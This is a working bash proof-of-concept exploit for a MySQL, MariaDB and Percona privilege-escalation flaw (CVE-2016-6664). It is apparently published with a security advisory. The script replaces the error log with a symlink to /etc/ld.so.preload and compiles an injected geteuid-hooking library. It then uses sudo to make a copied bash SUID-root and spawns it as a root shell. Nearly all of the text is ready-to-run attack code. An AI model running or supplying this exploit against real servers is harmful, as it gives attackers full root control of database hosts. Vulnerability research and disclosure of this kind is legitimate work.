#!/bin/bash -p
#
# Source: https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
#
# MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit
# mysql-chowned.sh (ver. 1.0)
#
# CVE-2016-6664 / OCVE-2016-5617
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# This PoC exploit allows attackers to (instantly) escalate their privileges
# from mysql system account to root through unsafe error log handling.
# The exploit requires that file-based logging has been configured (default).
# To confirm that syslog logging has not been enabled instead use:
# grep -r syslog /etc/mysql
# which should return no results.
#
# This exploit can be chained with the following vulnerability:
# CVE-2016-6663 / OCVE-2016-5616
# which allows attackers to gain access to mysql system account (mysql shell).
#
# In case database server has been configured with syslog you may also use:
# CVE-2016-6662 as an alternative to this exploit.
#
# Usage:
# ./mysql-chowned.sh path_to_error.log
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html
#
# Video PoC:
# https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/mysqlrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation."
	cleanexit 0
}

#intro
echo -e "\033[94m \nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / OCVE-2016-5617\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
	echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
	exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
id | grep -q mysql
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
	echo -e "\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn't exist. Try again.\n"
	exit 3
fi
echo -e "\n[+] Target MySQL log file set to $ERRORLOG"

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		//unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the log file to /etc
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"

# Wait for MySQL to re-open the logs
echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"
read -p "Do you want to kill mysqld process to instantly get root? :) ? [y/n] " THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	echo -e "Got it. Executing 'killall mysqld' now..."
	killall mysqld
fi
while :; do
	sleep 0.1
	if [ -f /etc/ld.so.preload ]; then
		echo $PRIVESCLIB > /etc/ld.so.preload
		rm -f $ERRORLOG
		break;
	fi
done

# /etc/	dir should be owned by mysql user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

#while :; do
#	sleep 0.1
#	ps aux | grep mysqld | grep -q 'log-error'
#	if [ $? -eq 0 ]; then
#		break;
#	fi
#done

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi


# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p

# Job done.
cleanexit 0